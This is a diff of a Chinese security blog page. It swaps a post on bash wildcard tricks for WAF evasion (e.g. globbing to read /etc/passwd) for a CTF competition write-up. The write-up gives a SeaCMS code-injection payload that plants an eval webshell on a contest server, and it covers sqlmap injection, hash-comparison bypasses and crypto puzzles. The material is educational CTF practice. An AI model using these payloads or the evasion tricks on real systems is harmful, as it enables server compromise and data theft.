@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="系统总结,">
+  <meta name="keywords" content="CTF,">
 
 
 
@@ -86,22 +86,38 @@
 
 
 
-<meta name="description" content="关于bash通配符有以下几个  ?是匹配一个任意字符.也就是说如果我们平时执行的是cat /etc/passwd可以用?来替代 例如： root@bee-box:~# which ls /bin/ls root@bee-box:~# echo /???/?s /bin/ls /bin/ps /sys/fs root@bee-box:~# 可以用/???/?s来取代.类似的cat也是可以用/???/">
-<meta name="keywords" content="系统总结">
+<meta name="description" content="周六做了一下嘉韦思杯，题目很入门，这里记录一下，太久没碰RE就没做了（其实是不会） 作战计划根据题目是seacms,百度一下seacms的漏洞，找到这么一篇文章 https://www.cnblogs.com/leixiao-/p/9786034.html 根据文章中的描述，构造如下payload http://47.103.43.235:84/search.php?searchtype=5&amp;am">
+<meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="bash通配符与命令执行">
-<meta property="og:url" content="https://yml-sec.top/2019/02/14/bash通配符与命令执行/index.html">
+<meta property="og:title" content="2019嘉韦思杯线上赛wp">
+<meta property="og:url" content="https://yml-sec.top/2019/04/01/2019嘉韦思杯线上赛wp/index.html">
 <meta property="og:site_name" content="yemoli&#39;s blog">
-<meta property="og:description" content="关于bash通配符有以下几个  ?是匹配一个任意字符.也就是说如果我们平时执行的是cat /etc/passwd可以用?来替代 例如： root@bee-box:~# which ls /bin/ls root@bee-box:~# echo /???/?s /bin/ls /bin/ps /sys/fs root@bee-box:~# 可以用/???/?s来取代.类似的cat也是可以用/???/">
+<meta property="og:description" content="周六做了一下嘉韦思杯，题目很入门，这里记录一下，太久没碰RE就没做了（其实是不会） 作战计划根据题目是seacms,百度一下seacms的漏洞，找到这么一篇文章 https://www.cnblogs.com/leixiao-/p/9786034.html 根据文章中的描述，构造如下payload http://47.103.43.235:84/search.php?searchtype=5&amp;am">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://i.loli.net/2019/03/18/5c8f714f915f7.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/18/5c8f716369fa8.jpg">
-<meta property="og:image" content="https://i.loli.net/2019/03/18/5c8f71742474b.jpg">
-<meta property="og:updated_time" content="2019-03-18T10:22:58.928Z">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f24863871e.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f26447c3fd.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f264479d47.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f26447fce4.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f264481d29.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f2729d625d.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f2898855f5.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f287e2aa96.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f2acd4c161.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f2ce79b9d0.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f2de98dff8.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f2e7766ab5.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f2ebb9ff8b.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f2f320cdb5.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f300c36891.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f307c82b64.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f32933058e.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f337b432be.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/30/5c9f341619bb4.jpg">
+<meta property="og:updated_time" content="2019-04-01T09:14:31.223Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="bash通配符与命令执行">
-<meta name="twitter:description" content="关于bash通配符有以下几个  ?是匹配一个任意字符.也就是说如果我们平时执行的是cat /etc/passwd可以用?来替代 例如： root@bee-box:~# which ls /bin/ls root@bee-box:~# echo /???/?s /bin/ls /bin/ps /sys/fs root@bee-box:~# 可以用/???/?s来取代.类似的cat也是可以用/???/">
-<meta name="twitter:image" content="https://i.loli.net/2019/03/18/5c8f714f915f7.png">
+<meta name="twitter:title" content="2019嘉韦思杯线上赛wp">
+<meta name="twitter:description" content="周六做了一下嘉韦思杯，题目很入门，这里记录一下，太久没碰RE就没做了（其实是不会） 作战计划根据题目是seacms,百度一下seacms的漏洞，找到这么一篇文章 https://www.cnblogs.com/leixiao-/p/9786034.html 根据文章中的描述，构造如下payload http://47.103.43.235:84/search.php?searchtype=5&amp;am">
+<meta name="twitter:image" content="https://i.loli.net/2019/03/30/5c9f24863871e.jpg">
 
 
 
@@ -131,13 +147,13 @@
 
 
 
-  <link rel="canonical" href="https://yml-sec.top/2019/02/14/bash通配符与命令执行/">
+  <link rel="canonical" href="https://yml-sec.top/2019/04/01/2019嘉韦思杯线上赛wp/">
 
 
 
 
 
-  <title>bash通配符与命令执行 | yemoli's blog</title>
+  <title>2019嘉韦思杯线上赛wp | yemoli's blog</title>
   
 
 
@@ -263,7 +279,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/02/14/bash通配符与命令执行/">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/04/01/2019嘉韦思杯线上赛wp/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="夜莫离、">
@@ -280,7 +296,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">bash通配符与命令执行</h1>
+          <h1 class="post-title" itemprop="name headline">2019嘉韦思杯线上赛wp</h1>
         
 
         <div class="post-meta">
@@ -292,8 +308,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-14T21:34:40+08:00">
-                2019-02-14
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-01T17:13:33+08:00">
+                2019-04-01
               </time>
             
 
@@ -324,7 +340,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  276
+                  810
                 </span>
               
 
@@ -340,7 +356,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  1
+                  3
                 </span>
               
             </div>
@@ -361,30 +377,113 @@
       
 
       
-        <p>关于bash通配符有以下几个</p>
-<p><img src="https://i.loli.net/2019/03/18/5c8f714f915f7.png" alt=""></p>
-<p>?是匹配一个任意字符.也就是说如果我们平时执行的是cat /etc/passwd可以用?来替代</p>
-<p>例如：</p>
-<pre><code>root@bee-box:~# which ls
-/bin/ls
-root@bee-box:~# echo /???/?s
-/bin/ls /bin/ps /sys/fs
-root@bee-box:~#
-</code></pre><p>可以用/???/?s来取代.类似的cat也是可以用/???/??t或者/???/c?t等来查找到.如果在绕waf的过程里面应该是可以直接拿出来用的.</p>
-<pre><code>root@bee-box:~# echo /???/c?t
-/bin/cat
-root@bee-box:~# echo /???/??t
-/bin/cat /dev/net /etc/apt /etc/opt /etc/rmt /var/opt
-</code></pre><p>试试常见的cat /etc/passwd<br>我们用/???/??t /???/??ss??来替换</p>
-<p>cat /etc/passwd</p>
-<p><img src="https://i.loli.net/2019/03/18/5c8f716369fa8.jpg" alt=""></p>
-<p>/???/??t /???/??ss??</p>
-<p><img src="https://i.loli.net/2019/03/18/5c8f71742474b.jpg" alt=""></p>
-<p>可以看到达到了同样的效果</p>
-<p>在安恒月赛里出现过一道题目：<br>    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>字母和数字都被过滤了，我们就可以利用上面的特性</p>
-<p>/???/??? =&gt; /bin/cat</p>
-<p>详细的wp在安全客:<a href="https://www.anquanke.com/post/id/160582?from=singlemessage" target="_blank" rel="noopener">https://www.anquanke.com/post/id/160582?from=singlemessage</a></p>
+        <p>周六做了一下嘉韦思杯，题目很入门，这里记录一下，太久没碰RE就没做了（其实是不会）</p>
+<h2 id="作战计划"><a href="#作战计划" class="headerlink" title="作战计划"></a>作战计划</h2><p>根据题目是seacms,百度一下seacms的漏洞，找到这么一篇文章</p>
+<p><a href="https://www.cnblogs.com/leixiao-/p/9786034.html" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/9786034.html</a></p>
+<p>根据文章中的描述，构造如下payload</p>
+<pre><code>http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd])
+</code></pre><p>用蚁剑链接，在服务器根目录下发现flag</p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f24863871e.jpg" alt="2.jpg"></p>
+<h2 id="土肥原贤二"><a href="#土肥原贤二" class="headerlink" title="土肥原贤二"></a>土肥原贤二</h2><p>很简单的题目，用sqlmap就可以跑出来</p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f26447c3fd.jpg" alt="3.jpg"></p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f264479d47.jpg" alt="4.jpg"></p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f26447fce4.jpg" alt="5.jpg"></p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f264481d29.jpg" alt="6.jpg"></p>
+<h2 id="吴佩孚"><a href="#吴佩孚" class="headerlink" title="吴佩孚"></a>吴佩孚</h2><p>base64解密链接中字符串，得到一串jsfuck，在浏览器执行即可得到flag</p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f2729d625d.jpg" alt="7.jpg"></p>
+<h2 id="日军空袭"><a href="#日军空袭" class="headerlink" title="日军空袭"></a>日军空袭</h2><p>这应该是一串不全的base64代码，解密过程中报了一次错，然后站点自动补了一段字符串</p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f2898855f5.jpg" alt="8.jpg"></p>
+<p>经过几次解密</p>
+<p>得到</p>
+<p>fB__l621a4h4g_ai{&amp;i}</p>
+<p>栅栏解密即可</p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f287e2aa96.jpg" alt="9.jpg"></p>
+<h2 id="飞虎队"><a href="#飞虎队" class="headerlink" title="飞虎队"></a>飞虎队</h2><p>题目是希尔加密</p>
+<p>在网上搜索很久</p>
+<p>找到了下面的站点</p>
+<p><a href="http://2-dreamfever.lofter.com/post/1d226cf1_748daf4" target="_blank" rel="noopener">http://2-dreamfever.lofter.com/post/1d226cf1_748daf4</a></p>
+<p>惊喜的是里面的矩阵和题目中的一样</p>
+<p>照着他的思路我们把密文转成数字</p>
+<p>a=0,b=1,c=2,d=3…</p>
+<p>解密矩阵</p>
+<pre><code>8  16  27
+
+8  99  24
+
+27 24  27
+</code></pre><p>矩阵为3*3 所以将密文3个分为一组 去乘解密矩阵然后mod(26)</p>
+<p>得到</p>
+<p>hillisflagxx</p>
+<h2 id="戴星炳"><a href="#戴星炳" class="headerlink" title="戴星炳"></a>戴星炳</h2><p>上脚本</p>
+<pre><code>import re
+import requests
+s = requests.Session()
+url = &apos;http://47.103.43.235:82/web/a/index.php&apos;
+r = s.get(url)
+#r.encoding = &apos;utf-8&apos;
+print(r.text)
+shi = re.compile(&apos;&lt;/p&gt;&lt;p&gt;(.*?)&lt;/p&gt;&apos;,re.S)
+num = re.findall(shi, r.text)
+print(num)
+#print (&apos;result:\n\n%s=%d\n&apos; % (num, eval(num)))
+#r = s.post(url, data={&apos;result&apos;: eval(num[0])})
+#print (r.text)
+numstr = &quot;&quot;
+
+result = eval(num[0])
+print(result)
+
+html = s.post(url,data={&apos;result&apos;:result})
+print(html.text)
+</code></pre><p><img src="https://i.loli.net/2019/03/30/5c9f2acd4c161.jpg" alt="10.jpg"></p>
+<h2 id="大美晚报"><a href="#大美晚报" class="headerlink" title="大美晚报"></a>大美晚报</h2><p>扫描二维码，没发现有用的信息</p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f2ce79b9d0.jpg" alt="11.jpg"></p>
+<p>winhex打开，在末尾发现zip数据段，提取出来</p>
+<p>根据提示QQ号，暴力破解压缩包密码</p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f2de98dff8.jpg" alt="13‘.jpg"></p>
+<p>打开即可获得flag</p>
+<h2 id="池步洲"><a href="#池步洲" class="headerlink" title="池步洲"></a>池步洲</h2><p>打开题目，查看源码，发现index.phps</p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f2e7766ab5.jpg" alt="14.jpg"></p>
+<p>下载后</p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f2ebb9ff8b.jpg" alt="15.jpg"></p>
+<p>两个字符串不同但是sha1值要相同，这里可以用数组绕过</p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f2f320cdb5.jpg" alt="16.jpg"></p>
+<h2 id="袁殊"><a href="#袁殊" class="headerlink" title="袁殊"></a>袁殊</h2><p>基础的RSA，用RSAtools跑一下就出来了</p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f300c36891.jpg" alt="17.jpg"></p>
+<h2 id="晴气庆胤"><a href="#晴气庆胤" class="headerlink" title="晴气庆胤"></a>晴气庆胤</h2><p>打开题目查看源码，发现了如下代码</p>
+<p><img src="https://i.loli.net/2019/03/30/5c9f307c82b64.jpg" alt="18.jpg"></p>
+<p>MD5碰撞的题目，网上有现成的整理的payload</p>
+<p><a href="https://www.cnblogs.com/zaqzzz/p/10029887.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/10029887.html</a></p>
+<h2 id="潘汉年"><a href="#潘汉年" class="headerlink" title="潘汉年"></a>潘汉年</h2><p><img src="https://i.loli.net/2019/03/30/5c9f32933058e.jpg" alt="19.jpg"></p>
+<p>题目是这样的</p>
+<p>然后提示flag格式，说明flag{和密文的前五位是对应的</p>
+<p>转换一下密文和flag{的ascii码对应的数值</p>
+<p>脚本：</p>
+<pre><code>a = &quot;bg[`s&quot;
+b = &quot;flag{&quot;
+a = list(a)
+b = list(b)
+
+for i in b:
+    print(ord(i))
+print(&apos;\n\n&apos;)
+for e in a:
+    print(ord(e))
+</code></pre><p><img src="https://i.loli.net/2019/03/30/5c9f337b432be.jpg" alt="20.jpg"></p>
+<p>可以看到他们ascii码对应数值的差是递增的4,5,6,7……</p>
+<p>这样题目就清晰了，解密flag脚本如下</p>
+<pre><code>a = &quot;bg[`sZ*Zg&apos;dPfP`VM_SXVd&quot;
+a = list(a)
+temp = 4
+flag = &quot;&quot;
+for i in a:
+    print(ord(i))
+    result = ord(i)+temp
+    temp = temp+1
+    flag = flag + chr(result)
+print(flag)
+</code></pre><p><img src="https://i.loli.net/2019/03/30/5c9f341619bb4.jpg" alt="21.jpg"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>可能是是第一届的原因吧，主办方或许有的地方经验还不太够，但是也能看出主办方是花了一些心思的，尤其是UI好评，也希望他们越办越好。</p>
 
       
     </div>
@@ -431,7 +530,7 @@ root@bee-box:~# echo /???/??t
       
         <div class="post-tags">
           
-            <a href="/tags/系统总结/" rel="tag"># 系统总结</a>
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
           
         </div>
       
@@ -444,8 +543,8 @@ root@bee-box:~# echo /???/??t
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/02/12/Python沙箱逃逸小结/" rel="next" title="Python沙箱逃逸小结">
-                <i class="fa fa-chevron-left"></i> Python沙箱逃逸小结
+              <a href="/2019/03/31/浅谈变量覆盖漏洞/" rel="next" title="浅谈变量覆盖漏洞">
+                <i class="fa fa-chevron-left"></i> 浅谈变量覆盖漏洞
               </a>
             
           </div>
@@ -453,10 +552,6 @@ root@bee-box:~# echo /???/??t
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/02/15/curl说明书/" rel="prev" title="curl说明书">
-                curl说明书 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -508,8 +603,17 @@ root@bee-box:~# echo /???/??t
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -600,6 +704,22 @@ root@bee-box:~# echo /???/??t
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#作战计划"><span class="nav-number">1.</span> <span class="nav-text">作战计划</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#土肥原贤二"><span class="nav-number">2.</span> <span class="nav-text">土肥原贤二</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#吴佩孚"><span class="nav-number">3.</span> <span class="nav-text">吴佩孚</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#日军空袭"><span class="nav-number">4.</span> <span class="nav-text">日军空袭</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#飞虎队"><span class="nav-number">5.</span> <span class="nav-text">飞虎队</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#戴星炳"><span class="nav-number">6.</span> <span class="nav-text">戴星炳</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#大美晚报"><span class="nav-number">7.</span> <span class="nav-text">大美晚报</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#池步洲"><span class="nav-number">8.</span> <span class="nav-text">池步洲</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#袁殊"><span class="nav-number">9.</span> <span class="nav-text">袁殊</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#晴气庆胤"><span class="nav-number">10.</span> <span class="nav-text">晴气庆胤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#潘汉年"><span class="nav-number">11.</span> <span class="nav-text">潘汉年</span></a></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number"></span> <span class="nav-text">总结</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
